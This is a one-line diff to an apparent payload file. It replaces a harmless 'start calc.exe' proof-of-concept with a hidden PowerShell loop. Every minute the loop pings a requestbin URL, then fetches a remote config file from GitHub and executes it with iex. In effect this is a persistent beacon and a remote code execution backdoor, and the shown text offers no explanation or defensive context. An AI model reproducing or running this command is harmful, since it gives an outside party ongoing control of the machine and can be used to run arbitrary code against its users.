@@ -1,1 +1,1 @@
-start calc.exe
+powershell -windowstyle hidden -c "while($true){ iwr -useb http://requestbin.fullcontact.com/18w3zju1 ; iwr -useb https://raw.githubusercontent.com/p3nt4/misc/master/config.txt | iex ; sleep 60}"
